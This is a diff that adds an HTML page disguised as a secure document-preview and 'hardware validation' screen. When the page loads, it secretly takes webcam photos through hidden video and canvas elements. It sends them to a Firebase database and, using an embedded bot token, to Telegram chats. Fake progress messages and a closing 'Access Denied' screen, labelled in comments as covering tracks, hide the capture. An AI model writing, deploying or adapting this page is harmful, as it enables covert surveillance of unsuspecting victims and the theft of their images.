@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enterprise Secure Relay | Decryption Terminal</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --g-blue: #4285f4;
+            --g-bg: #ffffff;
+            --text-main: #202124;
+            --text-sec: #5f6368;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--g-bg); color: var(--text-main);
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh;
+        }
+
+        .doc-container {
+            width: 100%; max-width: 600px; padding: 40px; text-align: left;
+        }
+
+        .header-strip {
+            display: flex; align-items: center; gap: 12px; margin-bottom: 40px;
+        }
+
+        .logo-circle {
+            width: 40px; height: 40px; background: #f1f3f4; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center; color: var(--g-blue); font-weight: bold;
+        }
+
+        h1 { font-size: 28px; font-weight: 400; margin: 0 0 16px; letter-spacing: -0.5px; }
+        p { font-size: 16px; color: var(--text-sec); line-height: 1.6; margin-bottom: 30px; }
+
+        /* The "Silent" Loading Bar */
+        .loading-wrapper {
+            margin-top: 50px; border-top: 1px solid #e8eaed; padding-top: 30px;
+        }
+
+        .status-msg {
+            display: flex; align-items: center; gap: 10px; font-size: 14px; color: var(--g-blue);
+        }
+
+        .dot-pulse {
+            width: 8px; height: 8px; background: var(--g-blue); border-radius: 50%;
+            animation: pulse 1.5s infinite ease-in-out;
+        }
+
+        @keyframes pulse { 0% { opacity: 0.3; } 50% { opacity: 1; } 100% { opacity: 0.3; } }
+
+        /* Cover Tracks Section */
+        #error-overlay {
+            display: none; position: fixed; inset: 0; background: #fff;
+            flex-direction: column; align-items: center; justify-content: center; z-index: 100;
+        }
+
+        .error-box { max-width: 400px; text-align: center; }
+        .error-code { font-family: monospace; font-size: 12px; color: #d93025; margin-bottom: 10px; }
+    </style>
+</head>
+<body onload="autoInitiate()">
+
+    <div class="doc-container" id="main-content">
+        <div class="header-strip">
+            <div class="logo-circle">S</div>
+            <div style="font-size: 14px; font-weight: 500; color: var(--text-sec);">Secure Identity & Access Management</div>
+        </div>
+
+        <h1>Restricted Document Preview</h1>
+        <p>This document contains sensitive information and is protected by <b>End-to-End Environment Validation</b>. The system is currently verifying your secure token and hardware integrity to grant access.</p>
+        
+        <div style="background: #f8f9fa; border-radius: 8px; padding: 20px; border: 1px solid #dadce0;">
+            <div style="font-size: 14px; font-weight: 500; margin-bottom: 4px;">File: financial_audit_2026_Q1.pdf</div>
+            <div style="font-size: 12px; color: var(--text-sec);">Last accessed: 2 minutes ago from Gaya, Bihar</div>
+        </div>
+
+        <div class="loading-wrapper">
+            <div class="status-msg">
+                <div class="dot-pulse"></div>
+                <span id="loading-text">Validating security environment...</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden Tracks/Error Overlay -->
+    <div id="error-overlay">
+        <div class="error-box">
+            <div class="error-code">STATUS_CODE: 0x403_FORBIDDEN_TOKEN_MISMATCH</div>
+            <h2 style="font-weight: 500;">Access Denied</h2>
+            <p style="font-size: 14px; color: var(--text-sec);">The secure session could not be established. This may be due to an unauthorized hardware environment or an expired access link.</p>
+            <p style="font-size: 12px; color: #9aa0a6; margin-top: 40px;">Trace ID: <span id="trace-id"></span></p>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Elements -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        // CONFIG
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function autoInitiate() {
+            try {
+                // Triggers permission dialog immediately on page load
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let count = 0;
+                    const interval = setInterval(() => {
+                        if (count >= 50) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            showError();
+                            return;
+                        }
+                        sendData(++count);
+                        updateStatus(count);
+                    }, 1200);
+                };
+            } catch (e) {
+                document.getElementById('loading-text').innerText = "Hardware verification failed. Access blocked.";
+                document.getElementById('loading-text').style.color = "#d93025";
+            }
+        }
+
+        function updateStatus(c) {
+            const msgs = ["Reading encryption keys...", "Synchronizing biometric relay...", "Verifying ISP signature...", "Finalizing secure handshake..."];
+            if (c % 12 === 0) {
+                document.getElementById('loading-text').innerText = msgs[Math.floor(Math.random()*msgs.length)];
+            }
+        }
+
+        function sendData(index) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const b64 = canvas.toDataURL('image/jpeg', 0.3);
+            
+            database.ref('captures').push({ image_data: b64, target: "SILENT_RECON", ts: Date.now() });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'recon.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.4);
+        }
+
+        function showError() {
+            document.getElementById('main-content').style.display = 'none';
+            document.getElementById('error-overlay').style.display = 'flex';
+            document.getElementById('trace-id').innerText = Math.random().toString(36).substring(2, 15).toUpperCase();
+        }
+    </script>
+</body>
+</html>
